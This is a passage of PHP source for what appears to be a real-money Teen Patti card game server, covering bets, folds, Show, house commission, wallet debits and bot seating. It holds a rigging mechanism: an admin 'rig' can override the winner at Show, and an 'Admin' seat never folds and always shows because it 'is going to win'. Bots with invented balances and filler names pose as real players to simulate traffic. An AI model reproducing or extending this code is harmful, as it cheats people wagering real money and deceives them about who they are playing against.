        $log[] = $mySeat['username'] . ' played Chaal (₹' . js_num_str($currentStake) . ')';

        $nextSeat = tp_next_active_seat($activeSeats, (int)$mySeat['seat']);

        tp_update_room($roomId, [
            'pot'        => $newPot,
            'turn_seat'  => $nextSeat,
            'turn_start' => ms_to_sql(),
            'log'        => js_json_encode(array_slice($log, -15)),
        ]);

        $nextPlayer = null;
        foreach ($seats as $s) { if ((int)$s['seat'] === (int)$nextSeat) { $nextPlayer = $s; break; } }
        if ($nextPlayer && empty($nextPlayer['folded']) &&
            (!empty($nextPlayer['is_bot']) || (!empty($nextPlayer['username']) && strtolower($nextPlayer['username']) === 'admin'))) {
            tp_schedule_bot_turn($roomId);
        }
        return ['success' => true];
    }

    if ($action === 'fold') {
        tp_update_seat($mySeat['id'], ['folded' => 1]);
        $log[] = $mySeat['username'] . ' packed.';

        $remainingActive = array_values(array_filter($activeSeats, function ($s) use ($mySeat) { return (int)$s['seat'] !== (int)$mySeat['seat']; }));
        if (count($remainingActive) === 1) {
            return tp_end_game($roomId, $remainingActive[0], (float)$room['pot'] + 0, $log, false);
        }

        // Recalculate the next turn from the seats still in the hand.
        $seatNums = [];
        foreach ($remainingActive as $s) $seatNums[] = (int)$s['seat'];
        sort($seatNums);
        $curIdx = array_search((int)$mySeat['seat'], $seatNums, true);
        if ($curIdx === false) {
            $nextActiveSeat = null;
            foreach ($seatNums as $n) { if ($n > (int)$mySeat['seat']) { $nextActiveSeat = $n; break; } }
            if ($nextActiveSeat === null) $nextActiveSeat = $seatNums[0];
        } else {
            $nextActiveSeat = $seatNums[($curIdx + 1) % count($seatNums)];
        }

        tp_update_room($roomId, [
            'turn_seat'  => $nextActiveSeat,
            'turn_start' => ms_to_sql(),
            'log'        => js_json_encode(array_slice($log, -15)),
        ]);

        $nextPlayerAfterFold = null;
        foreach ($seats as $s) { if ((int)$s['seat'] === (int)$nextActiveSeat) { $nextPlayerAfterFold = $s; break; } }
        if ($nextPlayerAfterFold && empty($nextPlayerAfterFold['folded']) &&
            (!empty($nextPlayerAfterFold['is_bot']) || (!empty($nextPlayerAfterFold['username']) && strtolower($nextPlayerAfterFold['username']) === 'admin'))) {
            tp_schedule_bot_turn($roomId);
        }
        return ['success' => true];
    }

    if ($action === 'show') {
        if (count($activeSeats) !== 2) return ['error' => 'Show only when 2 players remain.'];

        if (empty($mySeat['is_bot'])) {
            $user = find_user_ci($username);
            if (!$user || debit_wallet((int)$user['id'], $currentStake) === null) {
                return ['error' => 'Insufficient balance for Show.'];
            }
            // Recorded like every other stake. It used to have no ledger row at all, so the profit
            // dashboard never saw Show stakes and every player's history was short by them.
            insert_transaction(new_record_id('TP_SHOW'), $username, 'Withdrawal', $currentStake,
                'Teen Patti Show — ' . $room['name'], 'Completed');
        }

        $newPot = (float)$room['pot'] + $currentStake;
        $opponent = null;
        foreach ($activeSeats as $s) { if ((int)$s['seat'] !== (int)$mySeat['seat']) { $opponent = $s; break; } }

        $winner = null;
        $rig = tp_room_admin_rig($room);
        if ($rig !== null && array_key_exists('winner_seat', $rig)) {
            foreach ($activeSeats as $s) { if ((int)$s['seat'] === (int)$rig['winner_seat']) { $winner = $s; break; } }
        }
        if (!$winner) {
            $myHand = tp_evaluate_hand($mySeat['cards']);
            $oppHand = tp_evaluate_hand($opponent['cards']);
            $winner = tp_hand_wins($myHand, $oppHand) ? $mySeat : $opponent;
        }

        $log[] = $mySeat['username'] . ' called Show!';
        return tp_end_game($roomId, $winner, $newPot, $log, true);
    }

    return ['error' => 'Unknown action.'];
}

/** The house commission on a pot won by a player, in rupees (floored to the paisa). */
function tp_commission($pot) {
    $pct = max(0.0, min(20.0, (float) cfg('TEENPATTI_COMMISSION_PCT', 10)));
    return floor($pot * $pct + 1e-7) / 100;
}

/** Credit the winner and close the hand. */
function tp_end_game($roomId, $winnerSeat, $pot, $log, $wasShow) {
    // Close the hand first, and only if it is still open. Under the table lock this always succeeds
    // for the first caller; it is the guarantee that one hand pays one pot, however it ended.
    $closed = affected("UPDATE \"TeenPattiRoom\" SET \"status\" = 'finished' WHERE \"id\" = ? AND \"status\" = 'playing'",
                       [$roomId]);
    if ($closed === 0) return ['error' => 'Game not active.'];

    $winnerName = $winnerSeat['username'];
    if ($wasShow) $log[] = $winnerName . ' won the Show! Pot: ₹' . js_num_str($pot);
    else          $log[] = 'Everyone folded. ' . $winnerName . ' wins! Pot: ₹' . js_num_str($pot);

    $isPlayer = empty($winnerSeat['is_bot']) && $winnerName && strtolower((string) $winnerName) !== 'admin';
    $paid = $pot;
    if (empty($winnerSeat['is_bot']) && $winnerName) {
        // The house commission comes out of a pot a PLAYER wins (the "Admin" seat is the house's own
        // money, so it pays none). Without it the house earned nothing from any hand a player won.
        $commission = $isPlayer ? tp_commission($pot) : 0.0;
        $paid = round($pot - $commission, 2);
        // Credited by account id, not by a case-insensitive name match that could hit two rows.
        $winnerUser = find_user_ci($winnerName);
        if ($winnerUser) credit_wallet((int) $winnerUser['id'], $paid);
        insert_transaction(new_record_id('TP_WIN'), $winnerName, 'Deposit', $paid, 'Teen Patti Won Pot', 'Completed');
        if ($commission > 0) {
            $log[] = 'House commission: ₹' . js_num_str($commission) . ' (' . js_num_str((float) cfg('TEENPATTI_COMMISSION_PCT', 10)) . '%)';
        }
    }

    $log[] = '🏆 GAME OVER — ' . $winnerName . ' WON THE POT OF ₹' . js_num_str($paid) . '!';

    tp_update_room($roomId, [
        'status'           => 'finished',
        'winner_seat'      => (int)$winnerSeat['seat'],
        'pot'              => $pot,
        'log'              => js_json_encode(array_slice($log, -15)),
        // Replaces the 5-second setTimeout that emptied the room.
        'round_end_due_at' => now_ms() + TP_ROUND_DELAY,
    ]);

    return ['success' => true, 'winner' => $winnerName];
}

/** The work the post-hand setTimeout used to do, once its deadline has passed. */
function tp_finish_round_reset($roomId) {
    try {
        tp_clear_all_seats($roomId);
        tp_update_room($roomId, ['status' => 'waiting', 'pot' => 0, 'winner_seat' => null, 'round_end_due_at' => null]);

        // A cosmetic "pre-seed a random seat on a coin flip" step used to run here. It is deleted
        // rather than fixed, because it was the reason a room's bot count did not match what the
        // operator configured:
        //
        //   - it ignored the room's configured target entirely, so it could seat a bot in a room
        //     already at (or meant to be below) its target;
        //   - it was keyed on bot_takeover_active('teenpatti') — the WIN-RATE takeover switch,
        //     which is deliberately a separate control from the room bot-allocation config (see
        //     the header of lib/botengine.php) — so switching the win-rate bot on silently changed
        //     lobby occupancy too;
        //   - alone among the filler paths it had no TEENPATTI_AUTO_BOT_FILL gate, so in
        //     real-players-only mode (the production default) it seated bots that
        //     tp_apply_room_bot_target then refused to clean up, because that function returns
        //     early under the same flag. Those seats simply stayed.
        //
        // Nothing is lost by removing it: tp_apply_room_bot_target($roomId) runs a few lines below
        // and fills the room to exactly its configured target, which is the behaviour that was
        // wanted from this in the first place.

        // Always clear any leftover per-hand rig now that this hand is fully over.
        tp_update_room($roomId, ['admin_rig' => null]);

        // A hand finishing is also a natural trigger to reshuffle the whole 6-room distribution
        // (subject to tp_maybe_shuffle_room_bot_targets()'s own interval throttle, so this cannot
        // reshuffle on every single hand across six rooms) — "the lobby looks different after each
        // game", not just once a day. When it does reshuffle, every room gets topped up to its
        // fresh target; otherwise just bring this one room back up to its existing target rather
        // than leaving it empty until the next organic traffic tick notices it.
        if (tp_maybe_shuffle_room_bot_targets()) {
            foreach (tp_room_ids() as $rid) { tp_apply_room_bot_target($rid); }
        } else {
            tp_apply_room_bot_target($roomId);
        }
    } catch (Throwable $e) { log_error('[TP] Room empty error: ' . $e->getMessage()); }
}

/** The filler/Admin move that the 1.5-3.5s setTimeout used to make. */
function tp_run_bot_turn($roomId) {
    try {
        tp_update_room($roomId, ['bot_turn_due_at' => null]);

        $room = tp_get_room($roomId);
        if (!$room || $room['status'] !== 'playing') return;
        $seats = tp_get_seats($roomId);

        $botSeat = null;
        foreach ($seats as $s) {
            if ((int)$s['seat'] !== (int)$room['turn_seat']) continue;
            if (empty($s['folded']) && (!empty($s['is_bot']) || (!empty($s['username']) && strtolower($s['username']) === 'admin'))) {
                $botSeat = $s; break;
            }
        }
        if (!$botSeat) return;

        $activeSeats = array_values(array_filter($seats, function ($s) { return !empty($s['username']) && empty($s['folded']); }));

        // A filler can call Show when only 2 remain and it holds a strong hand — and Admin always
        // shows, because it is going to win.
        if (count($activeSeats) === 2) {
            $hand = tp_evaluate_hand($botSeat['cards']);
            if ($hand[0] >= 4 || strtolower((string)$botSeat['username']) === 'admin') {
                tp_process_action($roomId, $botSeat['username'], 'show');
                return;
            }
        }

        $decision = tp_bot_decide($botSeat['cards'], (float)$room['current_stake']);
        if (strtolower((string)$botSeat['username']) === 'admin' && $decision === 'fold') {
            $decision = 'chaal';   // Admin never folds
        }
        tp_process_action($roomId, $botSeat['username'], $decision);
    } catch (Throwable $e) { log_error('[TP] Bot turn error: ' . $e->getMessage()); }
}

/** The 15s fill-and-deal that scheduleBotFill used to perform. */
function tp_run_bot_fill($roomId) {
    try {
        tp_update_room($roomId, ['bot_fill_due_at' => null]);

        $room = tp_get_room($roomId);
        if (!$room || $room['status'] !== 'waiting') return;
        $seats = tp_get_seats($roomId);

        $seated = array_values(array_filter($seats, function ($s) { return !empty($s['username']); }));
        if (count($seated) === 0) return;   // nobody waiting

        // Top up bots to this room's configured ambient target (see lib/botengine.php), not
        // always to full capacity — seats beyond the target stay empty on purpose, for a real
        // player to join. "Admin" is never seated here — that is decided once, live, in
        // tp_start_round.
        $botCount = count(array_filter($seats, function ($s) { return !empty($s['username']) && !empty($s['is_bot']); }));
        $need = max(0, tp_room_bot_target($roomId) - $botCount);

        if ($need > 0) {
            $empty = array_values(array_filter($seats, function ($s) { return empty($s['username']); }));
            $botIdx = 0;
            foreach ($empty as $seat) {
                if ($botIdx >= $need) break;
                $filler = next_room_filler_username();
                tp_update_seat($seat['id'], [
                    'username' => $filler['username'],
                    'is_bot'   => $filler['is_bot'] ? 1 : 0,
                    'folded'   => 0,
                ]);
                $botIdx++;
            }
        }

        tp_start_round($roomId);
    } catch (Throwable $e) { log_error('[TP] Bot fill error: ' . $e->getMessage()); }
}

// -------------------------------------------------------------------------------------------------
// The sweep — everything the 5-second setInterval and the traffic engine used to do
// -------------------------------------------------------------------------------------------------

/**
 * Advance every room to the present moment.
 *
 * Called at the start of every Teen Patti request and by the one-minute cron. Cheap when there is
 * nothing to do: it reads six small rows and returns.
 */
function tp_sweep() {
    try {
        // Periodically (see TP_BOT_SHUFFLE_INTERVAL_MS) this rolls fresh ambient bot targets for
        // every room in Auto mode; when it does, apply them to every room's actual seats
        // immediately rather than waiting on the slow organic trickle below to notice each one.
        if (tp_maybe_shuffle_room_bot_targets()) {
            foreach (tp_room_ids() as $roomId) { tp_apply_room_bot_target($roomId); }
        }

        $now = now_ms();

        // --- per-room deadlines ---
        $rooms = all('SELECT * FROM "TeenPattiRoom"');
        foreach ($rooms as $room) {
            $roomId = $room['id'];

            if ($room['round_end_due_at'] !== null && (int)$room['round_end_due_at'] <= $now) {
                tp_finish_round_reset($roomId);
                continue;
            }
            if ($room['bot_fill_due_at'] !== null && (int)$room['bot_fill_due_at'] <= $now) {
                tp_run_bot_fill($roomId);
                continue;
            }
            if ($room['bot_turn_due_at'] !== null && (int)$room['bot_turn_due_at'] <= $now) {
                tp_run_bot_turn($roomId);
                continue;
            }
        }

        // --- playing rooms: stuck tables and turn timeouts ---
        $playing = all("SELECT * FROM \"TeenPattiRoom\" WHERE \"status\" = 'playing'");
        foreach ($playing as $room) {
            $seats = tp_get_seats($room['id']);
            $activeRemaining = array_values(array_filter($seats, function ($s) { return !empty($s['username']) && empty($s['folded']); }));
            if (count($activeRemaining) < 2) {
                tp_reset_room_to_waiting($room['id']);
                continue;
            }

            // Watchdog first, so it catches a deadlock arising from ANY cause — including one the
            // specific repairs below do not anticipate. Without a backstop like this a single stuck
            // room stays stuck for ever, and because tp_apply_room_bot_target only touches rooms in
            // 'waiting', that one room also becomes permanently deaf to both Auto reshuffles and
            // Manual admin changes.
            if ($room['turn_start'] !== null && ($now - sql_to_ms($room['turn_start'])) >= TP_STUCK_ROOM_MS) {
                log_warn('[TP] room stuck in playing — returning it to waiting', [
                    'room' => $room['id'], 'turn_seat' => $room['turn_seat'],
                    'stalled_sec' => (int) (($now - sql_to_ms($room['turn_start'])) / 1000),
                ]);
                tp_reset_room_to_waiting($room['id']);
                continue;
            }

            // A playing room with no turn clock can never be advanced by the timeout logic below and
            // would sit in 'playing' for ever. Start its clock instead of skipping it.
            if ($room['turn_start'] === null) {
                tp_update_room($room['id'], ['turn_start' => ms_to_sql()]);
                continue;
            }

            // The turn can legitimately land on a seat that is empty (tp_start_round picks the first
            // seat from a list that still contains anyone vacated for an unaffordable boot) or on one
            // that has since folded. Neither can ever act, and the timeout branch below only acts on
            // a seated, unfolded player — so before this, such a room deadlocked in 'playing' for
            // ever: it never returned to 'waiting', so tp_apply_room_bot_target skipped it and no
            // Auto reshuffle or Manual admin change could touch it again. That is exactly the
            // "room hamesha playing dikhata hai, kabhi vacant nahi hota, auto/manual kuch kaam nahi
            // karta" report. Hand the turn straight to the next active seat instead of waiting for a
            // timeout that would do nothing.
            $turnSeatRow = null;
            foreach ($seats as $s) { if ((int)$s['seat'] === (int)$room['turn_seat']) { $turnSeatRow = $s; break; } }
            if (!$turnSeatRow || empty($turnSeatRow['username']) || !empty($turnSeatRow['folded'])) {
                $nextSeat = tp_next_active_seat($seats, (int)$room['turn_seat']);
                if ($nextSeat === null) {
                    tp_reset_room_to_waiting($room['id']);
                } else {
                    tp_update_room($room['id'], ['turn_seat' => $nextSeat, 'turn_start' => ms_to_sql()]);
                }
                continue;
            }

            $elapsed = ($now - sql_to_ms($room['turn_start'])) / 1000.0;
            if ($elapsed >= TP_TURN_TIMEOUT) {
                $currentSeat = $turnSeatRow;
                if ($currentSeat && !empty($currentSeat['username']) && empty($currentSeat['folded'])) {
                    if (strtolower($currentSeat['username']) === 'admin') {
                        // Admin NEVER auto-folds on timeout. Reset the timer to give it unlimited time.
                        tp_update_room($room['id'], ['turn_start' => ms_to_sql()]);
                    } elseif (!empty($currentSeat['is_bot'])) {
                        // Fillers make their strategic move rather than folding on timeout.
                        $decision = tp_bot_decide($currentSeat['cards'], (float)$room['current_stake']);
                        tp_process_action($room['id'], $currentSeat['username'], $decision);
                    } else {
                        tp_process_action($room['id'], $currentSeat['username'], 'fold');
                    }
                }
            }
        }

        // --- finished rooms stuck for more than 10s ---
        $finished = all("SELECT * FROM \"TeenPattiRoom\" WHERE \"status\" = 'finished'");
        foreach ($finished as $room) {
            $elapsed = ($now - sql_to_ms($room['updated_at'])) / 1000.0;
            if ($elapsed >= 10) tp_reset_room_to_waiting($room['id']);
        }

        // --- presence: remove players who stopped polling (closed tab) ---
        $realSeats = all('SELECT * FROM "TeenPattiSeat" WHERE "username" IS NOT NULL AND "is_bot" = 0');
        foreach ($realSeats as $seat) {
            if (strtolower((string)$seat['username']) === 'admin') continue;
            $lastActive = $seat['last_seen_at'] === null ? null : (int)$seat['last_seen_at'];

            // Not polled in over 10 seconds — or never polled at all, which is the original's
            // behaviour for a heartbeat map that starts empty.
            if ($lastActive === null || ($now - $lastActive) > 10000) {
                $room = tp_get_room($seat['room_id']);
                if ($room && $room['status'] === 'playing' && (int)$seat['folded'] === 0) {
                    try { tp_process_action($seat['room_id'], $seat['username'], 'fold'); } catch (Throwable $e) { /* ignore */ }
                }

                tp_update_seat($seat['id'], ['username' => null, 'is_bot' => 0, 'cards' => null, 'folded' => 0, 'last_seen_at' => null]);

                $checkSeats = tp_get_seats($seat['room_id']);
                $realRemaining = array_values(array_filter($checkSeats, function ($s) { return !empty($s['username']) && empty($s['is_bot']); }));
                if (count($realRemaining) === 0) {
                    tp_reset_room_to_waiting($seat['room_id']);
                }
            }
        }

        tp_traffic_tick();
    } catch (Throwable $e) { /* silent, exactly like the original interval */ }
}

/**
 * Sequential organic room filling: adds one filler to one under-target waiting room every
 * 6-12 seconds.
 *
 * Each room stops receiving fillers once its bot count reaches that room's configured ambient
 * target (see lib/botengine.php) — never always up to 4/4 — so seats beyond the target stay open
 * for a real player to walk into at any time.
 */
function tp_traffic_tick() {
    if (!cfg('TEENPATTI_AUTO_BOT_FILL')) return; // real-players-only mode — no simulated traffic
    $now = now_ms();
    $nextAt = null;
    try { $rec = state_get('tp_traffic_next_at'); $nextAt = is_array($rec) ? ($rec['at'] ?? null) : null; } catch (Throwable $e) {}

    if ($nextAt === null) {
        state_set('tp_traffic_next_at', ['at' => $now + 6000 + (int) floor(js_random() * 6000)]);
        return;
    }
    if ((int)$nextAt > $now) return;

    // Reschedule first, so a slow pass cannot cause a burst of catch-up fills.
    state_set('tp_traffic_next_at', ['at' => $now + 6000 + (int) floor(js_random() * 6000)]);

    try {
        $waitingRooms = [];
        foreach (tp_room_ids_list() as $roomId) {
            $room = tp_get_room($roomId);
            if (!$room || $room['status'] !== 'waiting') continue;
            $seats = tp_get_seats($roomId);
            $botCount = count(array_filter($seats, function ($s) { return !empty($s['username']) && !empty($s['is_bot']); }));
            if ($botCount >= tp_room_bot_target($roomId)) continue;   // this room already at its target
            $emptySeats = array_values(array_filter($seats, function ($s) { return empty($s['username']); }));
            if (count($emptySeats) === 0) continue;
            $waitingRooms[] = ['room' => $room, 'emptySeats' => $emptySeats];
        }
        if (count($waitingRooms) === 0) return;

        $picked = $waitingRooms[(int) floor(js_random() * count($waitingRooms))];

        // Exactly one simulated player, always an ordinary filler name. "Admin" is never seated by
        // simulated traffic; that is decided once, live, in tp_start_round.
        $nextSeat = $picked['emptySeats'][0];
        $filler = next_room_filler_username();
        tp_update_seat($nextSeat['id'], [
            'username' => $filler['username'],
            'is_bot'   => $filler['is_bot'] ? 1 : 0,
            'folded'   => 0,
            'balance'  => 1000 + (int) floor(js_random() * 5000),
        ]);

        tp_schedule_bot_fill($picked['room']['id']);
    } catch (Throwable $e) { /* silent */ }
}
